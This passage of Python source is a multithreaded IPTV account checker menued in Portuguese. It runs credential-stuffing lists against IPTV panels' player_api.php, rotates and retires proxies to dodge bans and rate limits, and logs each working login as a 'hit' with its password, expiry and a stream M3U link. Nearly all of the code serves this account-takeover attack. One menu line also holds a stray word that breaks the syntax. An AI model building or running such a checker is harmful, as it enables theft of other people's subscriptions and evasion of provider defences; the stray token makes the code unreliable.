    for tipo in tipos_a_buscar:
        action = f"get_{tipo}_categories"
        url = f"http://{server}/player_api.php?username={username}&password={password}&action={action}"
        
        max_tentativas = config.get("tentativas_com_proxy", 3) if proxy_config else config.get("tentativas_sem_proxy", 2)
        for tentativa in range(max_tentativas):
            try:
                response = requests.get(
                    url,
                    proxies=proxy_config,
                    headers=headers,
                    timeout=config.get("timeout_com_proxy", 15) if proxy_config else config.get("timeout_sem_proxy", 10)
                )
                
                if response.status_code == 200:
                    try:
                        dados = response.json()
                        nomes_categorias = []

                        if isinstance(dados, list):

                            nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados]
                        elif isinstance(dados, dict):

                            if 'categories' in dados and isinstance(dados['categories'], list):
                                nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados['categories']]

                            elif f'{tipo}_categories' in dados and isinstance(dados[f'{tipo}_categories'], list):
                                nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados[f'{tipo}_categories']]

                        if nomes_categorias:
                            prefixo = {"live": "AO VIVO", "vod": "FILME", "series": "SÉRIE"}[tipo]
                            categorias_encontradas[prefixo] = nomes_categorias

                        break 
                        
                    except json.JSONDecodeError:
                        print("{}[AVISO] Resposta da API para '{}' não é JSON (tentativa {}/{}){}".format(cor.amarelo, tipo, tentativa + 1, max_tentativas, cor.reset))
                        if tentativa == max_tentativas - 1: break
                        time.sleep(1)
                
            except requests.exceptions.RequestException as e:
                print("{}[AVISO] Erro na requisição para '{}': {} (tentativa {}/{}){}".format(cor.amarelo, tipo, e, tentativa + 1, max_tentativas, cor.reset))
                if tentativa == max_tentativas - 1: break
                time.sleep(1)

    resultado_final = []
    for prefixo, nomes in categorias_encontradas.items():
        for nome in nomes:
            resultado_final.append(f"[{prefixo}] {nome}")
            
    return resultado_final


def contar_streams(server, username, password, proxy_config, headers, config):
    """Retorna quantidades de canais, filmes e séries"""
    tipos = {
        "canais_ao_vivo": "get_live_streams",
        "filmes": "get_vod_streams",
        "series": "get_series"
    }
    resultado = {}

    for chave, action in tipos.items():
        url = f"http://{server}/player_api.php?username={username}&password={password}&action={action}"
        tentativas = config.get("tentativas_com_proxy", 3) if proxy_config else config.get("tentativas_sem_proxy", 2)
        timeout = config.get("timeout_com_proxy", 15) if proxy_config else config.get("timeout_sem_proxy", 10)

        for tentativa in range(tentativas):
            try:
                resp = requests.get(url, headers=headers, proxies=proxy_config, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, list):
                        resultado[chave] = len(data)
                    else:
                        resultado[chave] = 0
                    break
            except:
                continue
        else:
            resultado[chave] = -1

    return resultado


def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, config, t=None):
    try:
        config = carregar_configuracoes()
        hit_settings = config.get("hit_settings", {})
        cat_cfg = config.get("category_settings", {})

        with open(caminho_arquivo, "a", encoding="utf-8") as f:
            f.write("=====[ DEEPSEEK CHECKER ]=====\n")
            f.write("DeepSeek Checker V6 - Revision 5\n")
            f.write("Coded by DeepSeek & ReyFxck Th.\n")
            f.write(f'{t("traduce.traduce_hit") if t else "HIT"}\n')
            f.write("=====[ HOST INFORMATION ]=====\n")
            if hit_settings.get("MESSAGE", True) and "message" in user_info and user_info["message"]:
                f.write(f'{t("checker.message") if t else "Message"}: {user_info["message"]}\n')
            if hit_settings.get("HOST", True):
                f.write(f'{t("checker.host") if t else "Host"}: {server}\n')
            if hit_settings.get("USER", True):
                f.write(f'{t("checker.user") if t else "User"}: {username}\n')
            if hit_settings.get("PASS", True):
                f.write(f'{t("checker.password") if t else "Password"}: {password}\n')
            if hit_settings.get("STATUS", True):
                f.write(f'{t("checker.status") if t else "Status"}: {status}\n')
            if hit_settings.get("TRIAL", True) and "is_trial" in user_info:
                teste = t("questions.yes") if user_info["is_trial"] == "1" else t("questions.no")
                f.write(f'{t("checker.trial") if t else "Trial"}: {teste}\n')
            if hit_settings.get("EXPIRATION", True) and exp_date:
                f.write(f'{t("checker.expiration") if t else "Expiration"}: {exp_date}\n')
            if hit_settings.get("CREATED_AT", True) and "created_at" in user_info and user_info["created_at"]:
                criado = converter_data(user_info["created_at"])
                f.write(f'{t("checker.created_at") if t else "Created"}: {criado}\n')
            if hit_settings.get("CONNECTIONS", True) and "active_cons" in user_info and "max_connections" in user_info:
                f.write(f'Connections: Active: {user_info["active_cons"]} | Max: {user_info["max_connections"]}\n')

            try:
                contagens = contar_streams(server, username, password, None, {}, config)
                if contagens:
                    if contagens.get("canais_ao_vivo", 0) >= 0:
                        f.write(f'CANAIS AO VIVO: {contagens["canais_ao_vivo"]}\n')
                    if contagens.get("filmes", 0) >= 0:
                        f.write(f'FILMES: {contagens["filmes"]}\n')
                    if contagens.get("series", 0) >= 0:
                        f.write(f'SÉRIES: {contagens["series"]}\n')
            except Exception as e:
                f.write(f'[!] Erro ao contar canais: {str(e)}\n')

            if hit_settings.get("TIMEZONE", True) and "timezone" in user_info and user_info["timezone"]:
                f.write(f'{t("checker.timezone") if t else "Timezone"}: {user_info["timezone"]}\n')
            if hit_settings.get("M3U_LINK", True):
                f.write(f'{t("checker.m3u_link") if t else "M3U Link"}: http://{server}/get.php?username={username}&password={password}&type=m3u8\n')

            if "categorias" in user_info and user_info["categorias"]:
                grupos = {"AO VIVO": [], "FILME": [], "SÉRIE": []}
                for categoria in user_info["categorias"]:
                    if "[AO VIVO]" in categoria:
                        grupos["AO VIVO"].append(categoria.replace("[AO VIVO] ", "").strip())
                    elif "[FILME]" in categoria:
                        grupos["FILME"].append(categoria.replace("[FILME] ", "").strip())
                    elif "[SÉRIE]" in categoria:
                        grupos["SÉRIE"].append(categoria.replace("[SÉRIE] ", "").strip())

                mapa_cabeçalhos = {
                    "AO VIVO": "====[ CATEGORIAS DE CANAIS ]====",
                    "FILME": "====[ CATEGORIAS DE FILMES ]====",
                    "SÉRIE": "====[ CATEGORIAS DE SÉRIES ]===="
                }

                decoracao_style = cat_cfg.get("decoracao_style", "normal")
                emojis = {"AO VIVO": "📺", "FILME": "🎬", "SÉRIE": "🎞️"}

                for tipo, itens in grupos.items():
                    if not itens:
                        continue

                    if cat_cfg.get("use_type_headers", True):
                        f.write(f"{mapa_cabeçalhos[tipo]}\n")

                    if cat_cfg.get("layout_style") == "empilhado":
                        for i, item in enumerate(itens, 1):
                            prefixo = f"{i}. " if cat_cfg.get("enumerate_categories", True) else ""
                            f.write(f"{prefixo}{item}\n")
                    else:
                        linha_formatada = []
                        for i, item in enumerate(itens, 1):
                            prefixo = f"{i}." if cat_cfg.get("enumerate_categories", True) else ""

                            if decoracao_style == "emoji":
                                prefixo_num = f"{i}." if cat_cfg.get("enumerate_categories", True) else ""
                                linha_formatada.append(f" {emojis.get(tipo, '')} {prefixo_num} {item}")
                            else:
                               linha_formatada.append(f"{prefixo}{item}")

                        if decoracao_style == "emoji":
                            separador = ""
                        else:
                            separador_raw = cat_cfg.get('join_separator', '•')
                            separador = f" {separador_raw} "
                            
                        f.write(f"{separador.join(linha_formatada)}\n")

                if cat_cfg.get("use_type_separators", True):
                    f.write(f"====[ IPTV CHK BY -- ReyFxck ]====\n\n")

    except Exception as e:
        error_msg = t("responses.error_saving_file") if t else "Error saving file"
        print("{}{} {}{}".format(cor.vermelho, error_msg, e, cor.reset))


def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans,
                    total_linhas, caminho_arquivo, usar_proxy, arquivo_proxy, config, t,
                    escolha_categoria="1", formato_paga=None):
    """
    Processa combos de contas IPTV com múltiplas threads
    Retorna: (hits, bads, bans)
    """
    lock = threading.Lock()
    proxies_bons = []
    proxies_ruins = []
    contador_proxies = {}
    MAX_USOS_POR_PROXY = 4

    class WorkerStats:
        def __init__(self):
            self.hits = 0
            self.bads = 0
            self.bans = 0

    def testar_conta(user, password):
        if usar_proxy == "1":
            resultado, proxy_escolhida = testar_com_proxy(user, password)
            return resultado, proxy_escolhida
        else:
            return testar_sem_proxy(user, password), None


    def testar_sem_proxy(user, password):
        """Testa conta sem usar proxy"""
        proxy_config = None
        return test_account(user, password, proxy_config, server, headers, t, escolha_categoria, config)

    def testar_com_proxy(user, password):
        """Testa conta usando proxy"""
        for proxy_candidata in proxies_bons + proxies:
            if proxy_candidata in proxies_ruins:
                continue

            with lock:
                if contador_proxies.get(proxy_candidata, 0) >= MAX_USOS_POR_PROXY:
                    continue

            proxy_config = configurar_proxy(tipo_proxy, proxy_candidata, formato_paga)
            resultado = test_account(user, password, proxy_config, server, headers, t, escolha_categoria, config)

            with lock:
                contador_proxies[proxy_candidata] = contador_proxies.get(proxy_candidata, 0) + 1
                atualizar_status_proxy(proxy_candidata, resultado[0])

            if resultado[0] in ["hit", "bad", "ban"]:
                return resultado, proxy_candidata

        return ("proxy_error", user, password, None, None, "No working proxy", None), None

    def atualizar_status_proxy(proxy, resultado):
        """Atualiza status da proxy com base no resultado"""
        if resultado in ["hit", "bad"]:
            if proxy not in proxies_bons:
                proxies_bons.append(proxy)
            if proxy in proxies_ruins:
                proxies_ruins.remove(proxy)
        elif resultado in ["ban", "429", "proxy_ruim"]:
            if proxy not in proxies_ruins:
                proxies_ruins.append(proxy)
            if proxy in proxies_bons:
                proxies_bons.remove(proxy)

    def worker(stats):
        """Função executada por cada thread"""
        try:
            while True:
                with lock:
                    if not combos:
                        break
                    user, password = combos.pop(0)
                    linha_atual = total_linhas - len(combos)

                resultado = testar_conta(user, password)

                tipo_resultado, username, password, status, exp_date, status_code, user_info = resultado[0]
                proxy_escolhida = resultado[1]

                with lock:
                    if tipo_resultado == "hit":
                        stats.hits += 1
                        salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, config, t)
                    elif tipo_resultado == "bad":
                        stats.bads += 1
                    elif tipo_resultado == "ban":
                        stats.bans += 1

                exibir_informacoes(
                    server=server,
                    user=username,
                    password=password,
                    status_code=status_code,
                    linha_atual=linha_atual,
                    total_linhas=total_linhas,
                    hits=stats.hits,
                    bads=stats.bads,
                    bans=stats.bans,
                    usar_proxy=usar_proxy,
                    proxies_bons_count=len(proxies_bons) if usar_proxy == "1" else 0,
                    proxies_ruins_count=len(proxies_ruins) if usar_proxy == "1" else 0,
                    tipo_proxy=tipo_proxy if usar_proxy == "1" else None,
                    arquivo_proxy=arquivo_proxy if usar_proxy == "1" else None,
                    proxy_escolhida=proxy_escolhida,
                    config=config,
                    t=t
                )
        except Exception as e:
            print("{}[ERRO NA THREAD] {}{}{}".format(cor.vermelho, e, cor.reset, ))
            traceback.print_exc()

    threads = []
    stats = WorkerStats()
    
    for _ in range(num_bots):
        thread = threading.Thread(target=worker, args=(stats,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return stats.hits, stats.bads, stats.bans



def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None, config=None, t=None):
    """Exibe as informações de verificação com banner e tabela atualizados"""

    output = []
    output.append("\033[H\033[J")
    output.append(banner_checking(config, t, return_str=True))

    deepseek = "\033[38;5;33m DEEPSEEK CHK\033[0m"
    infor_x = "\033[38;5;11m    INFORMATIONS\033[0m"
    
    tabela_host = [
        [f"\033[38;5;45m  Host: {cor.reset}", f"\033[38;5;47m http://{server} \033[0m"],
        [f"\033[38;5;153m  Status: {cor.reset}", status_code if status_code not in ["TIMED OUT", "Proxy Error", "Connection Error", "Request Error"] else f"{cor.vermelho}{status_code}{cor.reset}"],
        [f"\033[38;5;81m  User: {cor.reset}", user],
        [f"\033[38;5;117m  Pass: {cor.reset}", password],
        [f"\033[1;38;5;156m  Hits: {cor.reset}", f"   {hits} {cor.reset} "],
        [f"{cor.fail}  Fails: {cor.reset}", f"    {bads} "],
        [f"\033[1;38;5;214m  Banned: {cor.reset}", f"   {bans} {cor.reset} "],
        [f"\033[38;5;188m  Combo: {cor.reset}", f"{linha_atual}/{total_linhas} "],
        [f"\033[38;5;189m  Restam: {cor.reset}", f" {total_linhas - linha_atual} "]
    ]

    output.append(tabulate(tabela_host, headers=[deepseek, infor_x], tablefmt="pretty"))

    if usar_proxy == "1":
        tipo_proxy_str = {
            1: "HTTP/HTTPS",
            2: "SOCKS4",
            3: "SOCKS5"
        }.get(tipo_proxy, "Desconhecido")
        
        tabela_proxies = [
            [f"\n{cor.azul}PROXYS CONFIGS{cor.reset}", "INFO"],
            ["TIPO", tipo_proxy_str],
            ["ARQUIVO", os.path.basename(arquivo_proxy) if arquivo_proxy else "Nenhum arquivo carregado"],
            ["PROXY ATUAL", proxy_escolhida if proxy_escolhida else "Nenhuma proxy em uso"],
            ["ALIVE", f"{cor.verde}{proxies_bons_count}{cor.reset}"],
            ["BADS", f"{cor.vermelho}{proxies_ruins_count}{cor.reset}"],
            ["BANNED", f"{cor.amarelo}{bans}{cor.reset}"]
        ]
        output.append(tabulate(tabela_proxies, tablefmt="pretty"))

    print("\n".join(output))
    sys.stdout.flush()


def banner_checking(config, t, return_str=False):
    """Banner RGB com sequência exata: 6 cores crescentes + 5x6 cores decrescentes"""
    banner_color = config.get("banner_color", "90m")
    
    if banner_color == "rgb":

        if not hasattr(banner_checking, 'color_state'):
            banner_checking.color_state = {
                'current': 16,
                'direction': 1,
                'sequence_num': 0,
                'step': 0
            }
        
        state = banner_checking.color_state

        if state['sequence_num'] == 0:
            if state['step'] < 5:
                state['current'] += 1
                state['step'] += 1
            else:
                state['sequence_num'] = 1
                state['direction'] = -1
                state['current'] = state['current'] + 11
                state['step'] = 0
        else:
            if state['step'] < 5:
                state['current'] += state['direction']
                state['step'] += 1
            else:
                state['sequence_num'] += 1
                if state['sequence_num'] > 5:
                    state['sequence_num'] = 0
                    state['direction'] = 1
                    state['current'] = state['current'] + 6
                else:
                    state['current'] = state['current'] + 12
                state['step'] = 0

        state['current'] = max(16, min(state['current'], 255))

        banner_text = f"""\033[38;5;{state['current']}m
        ____                 ____            _    
       |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
       | | | |/ _ \\/ _ \\ '_ \\___ \\ / _ \\/ _ \\ |/ /
       | |_| |  __/  __/ |_) |__) |  __/  __/   < 
       |____/ \\___|\\___| .__/____/ \\___|\\___|_|\\_\\
        ___ ____ ______|_|   __   ____ _   _ _  __
       |_ _|  _ \\_   _\\ \\   / /  / ___| | | | |/ /
        | || |_) || |  \\ \\ / /  | |   | |_| | ' / 
        | ||  __/ | |   \\ V /   | |___|  _  | . \\ 
       |___|_|    |_|    \\_/     \\____|_| |_|_|\\_\\
                                            \033[0m
{cor.c_purple}
            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 6 Rev: 05{cor.reset}
            Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""
    
    else:
        banner_text = f"""\033[38;5;33m
        ____                 ____            _    
       |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
       | | | |/ _ \\/ _ \\ '_ \\___ \\ / _ \\/ _ \\ |/ /
       | |_| |  __/  __/ |_) |__) |  __/  __/   < 
       |____/ \\___|\\___| .__/____/ \\___|\\___|_|\\_\\
        ___ ____ ______|_|   __   ____ _   _ _  __
       |_ _|  _ \\_   _\\ \\   / /  / ___| | | | |/ /
        | || |_) || |  \\ \\ / /  | |   | |_| | ' / 
        | ||  __/ | |   \\ V /   | |___|  _  | . \\ 
       |___|_|    |_|    \\_/     \\____|_| |_|_|\\_\\
                                        \033[0m
{cor.c_purple}
            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 6 Rev: 05{cor.reset}
            Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""

    if return_str:
        return banner_text
    print(banner_text, end='')


def mostrar_menu_principal(config, t):
    banner(config, t)
    print("\n{}  ===== {} ====={}".format(cor.ciano, t('menu.main_title', 'MAIN MENU'), cor.reset))
    print("{}  {}{}".format(cor.atention, t('menu.choose_option', 'Please make a choice!'), cor.reset))
    print("{}  = [1] {}{}".format(cor.azul, t('menu.menu_start', 'START CHECKER SCAN'), cor.reset))
    print("{}  = [2] {}{}".format(cor.azul, t('menu.settings', 'GLOBAL SETTINGS'), cor.reset))
    print("{}  = [3] {}{}".format(cor.azul, t('menu.exit_script', 'EXIT SCRIPT'), cor.reset))
    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
    
    while True:
        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        if escolha in ("1", "2", "3"):
            if escolha == "3":
                banner(config, t)
                print("\n  {}{}{}".format(cor.amarelo, t('menu.exit_info1'), cor.reset))
                print("  {}{}{}".format(cor.verde, t('menu.exit_info2'), cor.reset))
                print("  {}{}{}".format(cor.azul, t('menu.exit_info3'), cor.reset))
                print("  {}{}{}".format(cor.white_n, t('menu.exit_info4'), cor.reset))
                sys.exit(0)
            return escolha
        print("\n{}  {}{}".format(cor.vermelho, t('responses.invalid_option', 'Invalid option!'), cor.reset))


def mostrar_menu_configuracoes(config, t):
    """Menu de configurações com opções de idioma, SO, categorias, banner e requisições"""
    while True:
        banner(config, t)
        print("\n{}  === {} ==={}".format(cor.ciano, t('settings_title', 'SETTINGS'), cor.reset))
        print("{}  = [1] {} (Atual: {}){}".format(cor.azul, t('change_language', 'Change Language'), config['idioma'], cor.reset))
        print("{}  = [2] {} (Atual: {}){}".format(cor.azul, t('change_os', 'Change operating system'), config.get('sistema_operacional', 'Não configurado'), cor.reset))
        print("{}  = [3] {}{}".format(cor.azul, t('menu.categoria_menu', 'CATEGORY SETTINGS'), cor.reset))
        print("{}  = [4] {}{}".format(cor.azul, t('menu.banner_settings', 'BANNER SETTINGS'), cor.reset)) um
        print("{}  = [5] Configurações de Requisição{}".format(cor.azul, cor.reset))
        print("{}  = [6] Configurar informações do HIT{}".format(cor.azul, cor.reset))
        print("{}  = [7] {}{}".format(cor.azul, t('save_exit', 'Save and exit'), cor.reset))
        print("{}{}{}  ".format(cor.ciano, "=" * 26, cor.reset))
        
        escolha = input("\n  {}{} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        
        if escolha == '1':
            config['idioma'] = selecionar_idioma()
        elif escolha == '2':
            config['sistema_operacional'] = escolher_sistema_operacional(config, t)
        elif escolha == '3':
            configurar_categoria(config, t)
        elif escolha == '4':
            configurar_banner(config, t)
        elif escolha == '5':
            configurar_requisicoes(config, t)
        elif escolha == '6':
            configurar_hit_settings(config, t)
        elif escolha == '7':
            salvar_configuracao(config)
            break
        else:
            print("{}{}{}".format(cor.vermelho, t('invalid_option', 'Opção inválida!'), cor.reset))


def configurar_banner(config, t):
    """Menu para configurar as opções do banner"""
    while True:
        banner(config, t)
        current_color = config.get("banner_color", "90m")
        color_name = "Azul padrão (90m)" if current_color == "90m" else "RGB (multicolorido)"
        
        print("\n{}  === CONFIGURAÇÕES DO BANNER ==={}".format(cor.ciano, cor.reset))
        print("{}  [1] Cor do banner (Atual: {}){}".format(cor.azul, color_name, cor.reset))
        print("{}  [2] Voltar{}".format(cor.azul, cor.reset))
        print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))

        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        
        if escolha == "1":
            print("\n{}Selecione o estilo do banner:{}".format(cor.ciano, cor.reset))
            print("{}[1] Azul padrão (90m){}".format(cor.azul, cor.reset))
            print("{}[2] RGB (multicolorido){}".format(cor.azul, cor.reset))
            color_choice = input("{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            )).strip()
            
            if color_choice == "1":
                config["banner_color"] = "90m"
            elif color_choice == "2":
                config["banner_color"] = "rgb"
            else:
                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                continue
                
            salvar_configuracao(config)
            print("{}Configuração do banner salva!{}".format(cor.verde, cor.reset))
            time.sleep(1)
        elif escolha == "2":
            break
        else:
            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))


def configurar_requisicoes(config, t):
    """Menu para configurar o comportamento das requisições"""
    while True:
        banner(config, t)
        print("\n{}  === CONFIGURAÇÕES DE REQUISIÇÃO ==={}".format(cor.ciano, cor.reset))
        print("{}  [1] Tentativas (sem proxy): {}{}".format(cor.azul, config.get('tentativas_sem_proxy', 2), cor.reset))
        print("{}  [2] Tentativas (com proxy): {}{}".format(cor.azul, config.get('tentativas_com_proxy', 3), cor.reset))
        print("{}  [3] Timeout (sem proxy): {}s{}".format(cor.azul, config.get('timeout_sem_proxy', 10), cor.reset))
        print("{}  [4] Timeout (com proxy): {}s{}".format(cor.azul, config.get('timeout_com_proxy', 15), cor.reset))
        print("{}  [5] Pausar se cair a internet: {}{}".format(cor.azul, 'ON' if config.get('pausar_queda_internet') else 'OFF', cor.reset))
        print(f"{cor.azul}  [6] Pausar ao receber 429: {'ON' if config.get('pausar_429', {}).get('ativo') else 'OFF'} ({config.get('pausar_429', {}).get('tempo', 60)}s){cor.reset}")
        print("{}  [7] Pausar ao receber 403: {}{}".format(cor.azul, 'ON' if config.get('pausar_403') else 'OFF', cor.reset))
        print("{}  [8] Voltar{}".format(cor.azul, cor.reset))
        print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))

        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()

        if escolha == "1":
            novo = input(f"{cor.ciano}Tentativas sem proxy:{cor.reset} ").strip()
            if novo.isdigit(): config["tentativas_sem_proxy"] = int(novo)
        elif escolha == "2":
            novo = input(f"{cor.ciano}Tentativas com proxy:{cor.reset} ").strip()
            if novo.isdigit(): config["tentativas_com_proxy"] = int(novo)
        elif escolha == "3":
            novo = input(f"{cor.ciano}Timeout sem proxy (s):{cor.reset} ").strip()
            if novo.isdigit(): config["timeout_sem_proxy"] = int(novo)
        elif escolha == "4":
            novo = input(f"{cor.ciano}Timeout com proxy (s):{cor.reset} ").strip()
            if novo.isdigit(): config["timeout_com_proxy"] = int(novo)
        elif escolha == "5":
            atual = config.get("pausar_queda_internet", False)
            config["pausar_queda_internet"] = not atual
        elif escolha == "6":
            atual = config.get("pausar_429", {}).get("ativo", False)
            novo_estado = not atual
            config["pausar_429"]["ativo"] = novo_estado
            if novo_estado:
                print("{}  [6] Pausar ao receber 429: {} ({}){}".format(
                    cor.azul,
                    'ON' if config.get('pausar_429', {}).get('ativo') else 'OFF',
                    config.get('pausar_429', {}).get('tempo', 60),
                    cor.reset
                ))
                tempo = input("{}Tempo de pausa ao receber 429 (s): {} >>> {}".format(
                    cor.ciano,
                    cor.reset,
                    cor.verde
                )).strip()
                if tempo.isdigit():
                    config["pausar_429"]["tempo"] = int(tempo)
        elif escolha == "7":
            atual = config.get("pausar_403", True)
            config["pausar_403"] = not atual
        elif escolha == "8":
            salvar_configuracao(config)
            break
        else:
            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))


def selecionar_tipo_categoria(config, t):
    """Permite ao usuário escolher o formato de exibição das categorias"""
    banner(config, t)
    print("\n{}  === {} ==={}".format(cor.ciano, t('menu.categoria_title', 'CONF. DE CATEGORIAS'), cor.reset))
    print("{}  [1] {} (Atual: {}){}".format(cor.azul, t('menu.categoria_empilhado', 'Empilhado'), '[✓]' if config['categoria_tipo'] == 'empilhado' else '[X]', cor.reset))
    print("    [1] CHANNEL | X")
    print("    [2] CHANNEL | Y")
    print("    [3] CHANNEL | Z")
    print("{}  [2] {} (Atual: {}){}".format(cor.azul, t('menu.categoria_unido', 'Unido'), '[✓]' if config['categoria_tipo'] == 'unido' else '[X]', cor.reset))
    print("    [1] CHANNEL | X • [2] CHANNEL | Y • [3] CHANNEL | Z")
    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))

    while True:
        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        if escolha == "1":
            return "empilhado"
        elif escolha == "2":
            return "unido"
        else:
            print("{}{}{}".format(cor.vermelho, t('responses.invalid_option'), cor.reset))


def configurar_categoria(config, t):
    """Submenu completo para configurar a exibição de categorias."""
    while True:
        cat_cfg = config.get("category_settings", {})
        banner(config, t)

        layout = cat_cfg.get('layout_style', 'empilhado').upper()
        use_header = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('use_type_headers', True) else f"{cor.vermelho}OFF{cor.reset}"
        show_count = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('show_count_in_list', False) else f"{cor.vermelho}OFF{cor.reset}"
        enumerate_cat = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('enumerate_categories', True) else f"{cor.vermelho}OFF{cor.reset}"

        if cat_cfg.get('decoracao_style') == 'emoji':
            current_decor = 'EMOJI'
        else:
            current_decor = f"'{cat_cfg.get('join_separator', ' • ')}'"

        print("\n{}  === CONFIGURAÇÕES DE CATEGORIA ==={}".format(cor.ciano, cor.reset))
        print("{}  [1] Estilo da Lista (Atual: {}){}".format(cor.azul, layout, cor.reset))
        print("{}  [2] Usar Cabeçalho de Tipo (Atual: {}){}".format(cor.azul, use_header, cor.reset))
        print("{}  [3] Estilo de Decoração (Atual: {}){}".format(cor.azul, current_decor, cor.reset))
        print("{}  [4] Numerar Categorias (Atual: {}){}".format(cor.azul, enumerate_cat, cor.reset))
        print("{}  [5] Mostrar Contagem na Lista (Atual: {}){}".format(cor.azul, show_count, cor.reset))
        print("{}  [6] Voltar{}".format(cor.azul, cor.reset))
        print("  {}{}{}\n".format(cor.ciano, "=" * 45, cor.reset))

        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()

        if escolha == '1':
            novo_layout = "unido" if cat_cfg.get('layout_style', 'empilhado') == "empilhado" else "empilhado"
            config["category_settings"]["layout_style"] = novo_layout
        
        elif escolha == '2':
            config["category_settings"]["use_type_headers"] = not cat_cfg.get('use_type_headers', True)
       
        elif escolha == "3":
            print("\n{}  --- Escolha um Estilo de Decoração ---{}".format(cor.ciano, cor.reset))
            
            decoracoes = {
                "1": ("•", "Ponto tradicional"),
                "2": ("<<×>>", "Seta dupla"),
                "3": ("<=>", "Seta equilibrada"),
                "4": ("~♪~", "Nota musical"),
                "5": ("ｰᝄｰ", "PSX Classic"),
                "6": (None, "Emojis por categoria (📺🎬🎞️)    "),
                "7": ("««◌»»", "Rimi Classic")
            }
            
            for key, (sep, desc) in decoracoes.items():
                print("{}  [{}] {} {}{}".format(cor.azul, key, desc.ljust(25), sep if key != '6' else '📺🎬🎞️', cor.reset))
            
            print("{}  [99] CUSTOM (Digitar o seu){}".format(cor.magenta, cor.reset))
            sub_escolha = input("\n{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            )).strip()
            
            if sub_escolha in decoracoes:
                if sub_escolha == "6":

                    config["category_settings"]["decoracao_style"] = "emoji"
                    config["category_settings"].pop("join_separator", None)
                else:

                    config["category_settings"]["join_separator"] = decoracoes[sub_escolha][0]
                    config["category_settings"]["decoracao_style"] = "normal"
            elif sub_escolha == "99":
                print("\n{}Digite o seu separador personalizado:{}".format(cor.amarelo, cor.reset))
                novo_separador = input("{}  {} >>> {}".format(
                    cor.verde,
                    t('responses.response'),
                    cor.reset
                )).strip()
                config["category_settings"]["join_separator"] = novo_separador.strip()
                config["category_settings"]["decoracao_style"] = "normal"
            else:
                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                time.sleep(2)
                continue

        elif escolha == '4':
            config["category_settings"]["enumerate_categories"] = not cat_cfg.get('enumerate_categories', True)
        
        elif escolha == '5':
            config["category_settings"]["show_count_in_list"] = not cat_cfg.get('show_count_in_list', False)
        
        elif escolha == '6':
            break
        
        else:
            print("{}{}{}".format(cor.vermelho, t('responses.invalid_option', 'Opção inválida!'), cor.reset))
            time.sleep(1)
            continue

        salvar_configuracao(config)


def selecionar_busca_categorias(t):
    """Exibe um menu para o usuário escolher quais categorias buscar."""
    print("\n  {}{}{}".format(cor.ciano, "=" * 45, cor.reset))
    print("  {}{}{}".format(cor.atention, t('questions.show_categories', 'Quais categorias você quer que apareça nos hits?'), cor.reset))
    print("  {}{}{}\n".format(cor.ciano, "=" * 45, cor.reset))
        
    opcoes = {
        "1": "Nada [ Nenhuma categoria ]",
        "2": "Tudo [ Ao vivo, Filmes, Séries ]",
        "3": "Apenas » Ao vivo, Filmes",
        "4": "Apenas » Filmes, Séries",
        "5": "Apenas » Ao vivo",
        "6": "Apenas » Filmes",
        "7": "Apenas » Séries",
        "8": "Apenas » Ao vivo, Séries"
    }

    for key, value in opcoes.items():

        if len(key) == 1:
            print("     {}{}» {}{}".format(cor.azul, key, value, cor.reset))
        else:
            print("    {}{}» {}{}".format(cor.azul, key, value, cor.reset))
        
    print("\n  {}{}{}".format(cor.ciano, "=" * 45, cor.reset))

    while True:
        escolha = input("\n  {}{} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        if escolha in opcoes:
            return escolha
        else:
            print("\n  {}{}{}".format(cor.vermelho, t('responses.invalid_option', 'Opção inválida!'), cor.reset))


def main():
    proxies = []
    tipo_proxy = None
    config = carregar_configuracoes()
    t = criar_t(config)

    if not config.get("sistema_operacional"):
        config["sistema_operacional"] = escolher_sistema_operacional(config, t)
        config["configurado"] = True
        salvar_configuracao(config)

    if not config.get("idioma"):
        banner(config, t)
        print("\n  {}Idioma não configurado. Selecione o idioma:{}".format(cor.amarelo, cor.reset))
        config["idioma"] = selecionar_idioma()
        salvar_configuracao(config)

    while True:
        escolha = mostrar_menu_principal(config, t)
        if escolha == "1":
            break
        elif escolha == "2":
            mostrar_menu_configuracoes(config, t)

